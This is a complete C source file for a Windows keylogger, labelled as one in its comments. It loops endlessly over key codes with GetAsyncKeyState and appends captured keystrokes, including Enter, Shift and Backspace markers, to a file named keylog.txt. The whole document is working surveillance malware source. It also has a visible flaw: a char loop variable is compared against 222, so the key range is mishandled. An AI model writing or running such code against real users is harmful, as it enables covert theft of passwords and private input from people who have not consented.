#include <stdio.h>
#include <windows.h>

// Function to log the keystrokes
void logKeystrokes() {
    char key;
    FILE *outputFile;

    // Open a file in append mode to store the keystrokes
    outputFile = fopen("keylog.txt", "a+");

    while (1) {
        // Loop through all keys from 8 to 222
        for (key = 8; key <= 222; key++) {
            if (GetAsyncKeyState(key) == -32767) {
                // Log the keystroke
                if ((key >= 39) && (key <= 64)) {
                    fprintf(outputFile, "%c", key);
                } else if ((key > 64) && (key < 91)) {
                    fprintf(outputFile, "%c", key + 32); // Convert to lowercase
                } else {
                    switch (key) {
                        case VK_SPACE:
                            fprintf(outputFile, " ");
                            break;
                        case VK_SHIFT:
                            fprintf(outputFile, " [SHIFT] ");
                            break;
                        case VK_RETURN:
                            fprintf(outputFile, " [ENTER] ");
                            break;
                        case VK_BACK:
                            fprintf(outputFile, " [BACKSPACE] ");
                            break;
                        case VK_TAB:
                            fprintf(outputFile, " [TAB] ");
                            break;
                        case VK_ESCAPE:
                            fprintf(outputFile, " [ESCAPE] ");
                            break;
                        default:
                            break;
                    }
                }
                fflush(outputFile);
            }
        }
    }
    fclose(outputFile);
}

int main() {
    // Call the keylogger function
    logKeystrokes();

    return 0;
}